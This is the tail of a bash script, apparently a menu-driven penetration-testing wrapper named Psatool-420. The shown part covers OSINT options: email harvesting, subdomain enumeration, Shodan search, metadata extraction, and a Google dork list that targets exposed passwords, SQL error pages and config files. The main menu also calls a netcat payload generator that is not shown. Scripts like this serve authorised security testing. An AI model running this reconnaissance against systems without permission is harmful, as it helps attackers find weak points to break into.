                echo -e "\033[1;31mDomain required!\033[0m"
                return
            fi
            
            echo -e "\033[1;34mSelect search engine:\033[0m"
            echo -e "\033[1;36m1)\033[0m \033[1;32mAll available sources\033[0m"
            echo -e "\033[1;36m2)\033[0m \033[1;32mGoogle\033[0m"
            echo -e "\033[1;36m3)\033[0m \033[1;32mBing\033[0m"
            echo -e "\033[1;36m4)\033[0m \033[1;32mLinkedIn\033[0m"
            echo -n "Enter your choice: "
            read source_choice
            
            case $source_choice in
                1) source="all" ;;
                2) source="google" ;;
                3) source="bing" ;;
                4) source="linkedin" ;;
                *) 
                    source="all"
                    echo -e "\033[1;33mUsing all sources\033[0m"
                    ;;
            esac
            
            echo -e "\033[1;33m[*] Running theHarvester...\033[0m"
            theHarvester -d $domain -b $source -l 500
            echo -e "\n\033[1;32m[*] Email harvesting completed.\033[0m"
            ;;
            
        4)
            # Subdomain Finder using Sublist3r
            echo -e "\033[1;34mEnter domain for subdomain search:\033[0m"
            read domain
            if [[ -z "$domain" ]]; then
                echo -e "\033[1;31mDomain required!\033[0m"
                return
            fi
            
            # Ask if the user wants to save the result or view it directly
            echo -e "\033[1;34mWould you like to (S)ave or (V)iew the results? (S/V):\033[0m"
            read save_or_view
            
            if [[ "$save_or_view" == "S" || "$save_or_view" == "s" ]]; then
                echo -e "\033[1;34mEnter output filename (without extension):\033[0m "
                read output_file
                if [[ -z "$output_file" ]]; then
                    output_file="subdomains_$(date +%Y%m%d_%H%M%S)"
                fi
                
                echo -e "\033[1;33m[*] Running subdomain search and saving results...\033[0m"
                sublist3r -d $domain -o results/$output_file.txt
                echo -e "\033[1;32m[*] Search completed. Results saved to 'results/$output_file.txt'\033[0m"
            else
                echo -e "\033[1;33m[*] Running subdomain search...\033[0m"
                sublist3r -d $domain
                echo -e "\n\033[1;32m[*] Subdomain search completed.\033[0m"
            fi
            ;;
            
        5)
            # Google Dorks Generator
            echo -e "\033[1;34m=== Google Dorks Generator ===\033[0m"
            echo -e "\033[1;34mEnter domain to generate dorks for:\033[0m"
            read domain
            if [[ -z "$domain" ]]; then
                echo -e "\033[1;31mDomain required!\033[0m"
                return
            fi
            
            echo -e "\033[1;32m[*] Generated Google Dorks for $domain:\033[0m"
            echo -e "\033[1;33m1. site:$domain filetype:pdf\033[0m"
            echo -e "\033[1;33m2. site:$domain intitle:\"index of\"\033[0m"
            echo -e "\033[1;33m3. site:$domain intext:password\033[0m"
            echo -e "\033[1;33m4. site:$domain ext:php | ext:asp | ext:aspx | ext:jsp | ext:jspx | ext:swf | ext:fla | ext:xml\033[0m"
            echo -e "\033[1;33m5. site:$domain inurl:login | inurl:signin | intitle:Login | intitle:\"sign in\"\033[0m"
            echo -e "\033[1;33m6. site:$domain intext:\"sql syntax near\" | intext:\"syntax error has occurred\" | intext:\"incorrect syntax near\"\033[0m"
            echo -e "\033[1;33m7. site:$domain \"powered by\" | \"created by\" | \"built by\"\033[0m"
            echo -e "\033[1;33m8. site:$domain ext:doc | ext:docx | ext:odt | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv\033[0m"
            echo -e "\033[1;33m9. site:$domain inurl:wp- | inurl:plugin | inurl:upload | inurl:download\033[0m"
            echo -e "\033[1;33m10. site:$domain inurl:readme | inurl:license | inurl:install | inurl:setup | inurl:config\033[0m"
            ;;
            
        6)
            # Metadata Extractor using exiftool
            echo -e "\033[1;34m=== Metadata Extractor ===\033[0m"
            echo -e "\033[1;34mEnter the file path to extract metadata:\033[0m"
            read file_path
            if [[ ! -f "$file_path" ]]; then
                echo -e "\033[1;31mFile not found!\033[0m"
                return
            fi
            
            echo -e "\033[1;33m[*] Extracting metadata from $file_path...\033[0m"
            exiftool "$file_path"
            echo -e "\n\033[1;32m[*] Metadata extraction completed.\033[0m"
            ;;
            
        7)
            # Shodan Search
            echo -e "\033[1;34m=== Shodan Search ===\033[0m"
            echo -e "\033[1;33mNote: This requires the Shodan CLI to be installed and configured with an API key.\033[0m"
            echo -e "\033[1;34mEnter search query (e.g., 'hostname:example.com' or 'apache country:US'):\033[0m"
            read shodan_query
            if [[ -z "$shodan_query" ]]; then
                echo -e "\033[1;31mSearch query required!\033[0m"
                return
            fi
            
            # Check if shodan CLI is installed
            if ! command -v shodan &> /dev/null; then
                echo -e "\033[1;31mShodan CLI not found. Install it with 'pip install shodan' and initialize with 'shodan init YOUR_API_KEY'\033[0m"
                return
            fi
            
            echo -e "\033[1;33m[*] Running Shodan search...\033[0m"
            shodan search --fields ip_str,port,org,hostnames,os "$shodan_query"
            echo -e "\n\033[1;32m[*] Shodan search completed.\033[0m"
            ;;
            
        8)
            # Return to main menu
            return
            ;;
            
        *)
            echo -e "\033[1;31mInvalid choice!\033[0m"
            ;;
    esac
    
    echo -e "\033[1;33mPress Enter to continue...\033[0m"
    read
    
    # After action is completed, show OSINT menu again
    run_osint
}



# Main execution loop
main() {
    while true; do
        show_banner
        show_menu
        read choice
        
case $choice in
    1)
        run_nmap
        ;;
    2)
        run_gobuster
        ;;
    3)
        run_wpscan
        ;;
    4)
        run_john
        ;;
    5)
        generate_netcat_payload
        ;;
    6)
        run_sqlmap
        ;;
    7)
        run_nikto
        ;;
    8)
        run_osint
        ;;
    9)
        echo -e "\033[1;32m[*] Thank you for using Psatool-420!\033[0m"
        exit 0
        ;;
    *)
        echo -e "\033[1;31mInvalid option. Please try again.\033[0m"
        sleep 2
        ;;
esac
    done
}

# Start the program
main
